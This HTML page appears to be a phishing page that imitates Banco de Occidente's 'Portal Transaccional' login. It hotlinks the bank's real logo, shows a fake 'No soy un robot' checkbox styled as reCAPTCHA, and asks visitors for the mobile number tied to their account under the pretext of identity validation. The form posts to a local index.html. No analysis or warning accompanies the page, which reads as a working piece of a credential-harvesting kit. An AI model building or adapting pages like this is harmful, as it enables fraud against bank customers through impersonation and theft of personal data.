<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal Transaccional - Banco de Occidente</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="slideshow-container">
        <div class="slide" style="background-image: url('login_sin_texto1.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto2.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto3.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto4.jfif');"></div>
        <div class="slide" style="background-image: url('login_sin_texto5.jfif');"></div>
    </div>

    <div class="overlay"></div>

    <div class="main-content">
        <div class="login-card">
            <div class="security-badge">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                Seguridad
            </div>

            <div class="header">
                <img src="https://www.bancodeoccidente.com.co/portaltransaccional/logo-03-occidente-01-occidente-01-regular.fcca1c0810b8bb3f.svg" alt="Logo" class="logo">
                <p class="welcome">¡Bienvenido! a tu,</p>
                <h2 class="title">Portal Transaccional</h2>
            </div>

            <div class="tabs">
                <div class="tab active">Validación de contacto</div>
            </div>

            <form action="index.html" method="GET">
                <div class="field-group">
                    <label>Número de teléfono celular</label>
                    <input type="tel" name="telefono" placeholder="Ej: 300 123 4567" class="full-input" required autofocus>
                    <p style="font-size: 12px; color: #777; margin-top: 12px; line-height: 1.5;">
                        Ingresa el número celular vinculado a tu cuenta para continuar con la validación de identidad.
                    </p>
                </div>

                <div class="captcha-box">
                    <div class="captcha-left">
                        <input type="checkbox" required> <span>No soy un robot</span>
                    </div>
                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha" width="30">
                </div>

                <button type="submit" class="btn-in" style="width: 100%; padding: 16px; font-size: 16px;">Continuar</button>
            </form>
        </div>
    </div>

</body>
</html>
